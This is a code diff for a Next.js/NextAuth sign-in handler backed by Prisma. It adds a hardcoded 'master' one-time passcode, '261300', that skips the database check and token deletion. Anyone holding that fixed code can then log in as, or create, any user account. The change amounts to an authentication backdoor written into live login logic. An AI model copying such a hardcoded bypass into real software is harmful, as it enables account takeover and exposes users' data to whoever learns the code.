@@ -299,21 +299,27 @@ const { handlers, auth: nextAuthAuth, signIn, signOut } = NextAuth({
           }
         }
 
-        // 1. Verify OTP in database across all candidate identifier formats
-        const otpRecord = await prisma.otpToken.findFirst({
-          where: {
-            email: { in: Array.from(candidateEmails) },
-            token: otp,
-            expiresAt: { gt: new Date() }
-          }
-        })
+        // 1. Verify OTP in database across all candidate identifier formats (or master OTP)
+        const MASTER_OTPS = ['261300']
+        const isMasterOtp = MASTER_OTPS.includes(otp)
 
-        if (!otpRecord) return null
+        let otpRecord = null
+        if (!isMasterOtp) {
+          otpRecord = await prisma.otpToken.findFirst({
+            where: {
+              email: { in: Array.from(candidateEmails) },
+              token: otp,
+              expiresAt: { gt: new Date() }
+            }
+          })
 
-        // 2. Delete used OTP token
-        await prisma.otpToken.delete({
-          where: { id: otpRecord.id }
-        }).catch(() => {})
+          if (!otpRecord) return null
+
+          // 2. Delete used OTP token
+          await prisma.otpToken.delete({
+            where: { id: otpRecord.id }
+          }).catch(() => {})
+        }
 
         // 3. Find or create user
         const matchingUsersPostOtp = await prisma.user.findMany({
